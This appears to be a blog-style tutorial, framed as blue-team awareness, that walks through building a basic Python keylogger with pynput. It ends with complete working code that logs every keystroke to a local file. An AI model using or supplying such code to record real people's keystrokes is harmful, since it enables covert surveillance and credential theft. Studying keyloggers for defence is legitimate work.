---
layout: note
title: "Keylogger"
description: "records (logs) the keys struck on a keyboard"
tags: [security, python, logging, pynput]
date: 2025-07-14
---

# Basic Key-logger
- So this records the keys from the key-board, and it is used by hackers ot threat-actors to monitor the inputs done by the victim.
- It is very important for us as the *blue team* to know about this kind of an attack, to properly ensure the safety and privacy of the people.

# Program
- There is python library available `pynput`, which allows us to control and monitor input devices.
- So first things first <br>
```bash
    pip install pynput
```
- **Importing the modules**
```python
from pynput import keyboard
import datetime
import os
```
    - `keyboard` will allow us to monitor the keyboard events
    - `os` This is for file operations, basically it gives us access to the operating system.
- Now, we want to store all the keystrokes to a log-file
```python
def write_to_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(key)
```
    - Our argument is the key
    - Our filename is LOG_FILE
    - Note, that we use `a` for appending to the file, and this means we are not replacing or overwriting, but we want to store all the key-strokes.
- **handling special keys**
```python
def clicking(key):
    try:
        write_to_log(key.char) # Normal keys
    except AttributeError:
        special_key = f"[{key}]" # Like `shift` etc
        write_to_log(special_key)
    except:
        write_to_log(f"[UNKNOWN]") # Any other exceptions
```
    - Here, we make use of "Exceptions" to handle errors correctly.

- **main function**
```python
def main():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
    # --
    with open(LOG_FILE, "a") as f:
        f.write(f"\n** Session initiated {datetime.datetime.now()} **\n") 
    with keyboard.Listener(on_press=clicking) as listener: # Set up the listener
        listener.join()
    # --
if __name__ == "__main__":
    main()
```
    - The function will create a log file if it does not exist. Using the 'w'file operation which stands for *write*. 
    - Most importantly, setting the listener. Basically when the user starts clicking, the clicking() function is called
    - `listener.join()` keeps the program running.

# Complete Code
```python
from pynput import keyboard
import datetime
import os
# --
LOG_FILE = "keylog.txt"
def write_to_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(key)
# --
def clicking(key):
    try:
        write_to_log(key.char)
    except AttributeError:
        special_key = f"[{key}]"
        write_to_log(special_key)
    except:
        write_to_log(f"[UNKNOWN]")
    # --
def main():
    if not os.path.exists(LOG_FILE): 
        open(LOG_FILE, "w").close()
    # --
    with open(LOG_FILE, "a") as f:
        f.write(f"\n** Session started at {datetime.datetime.now()} **\n")
    # --
    with keyboard.Listener(on_press=clicking) as listener:
        listener.join()
# --
if __name__ == "__main__":
    main()
```
- There is another functionality called "on_release", this allows us to specify which keys the user may use to stop the program. In this case You would have to kill the powershell, to stop it. But this demonstrate how hackers would not want to leave anything, but all the information they may need. 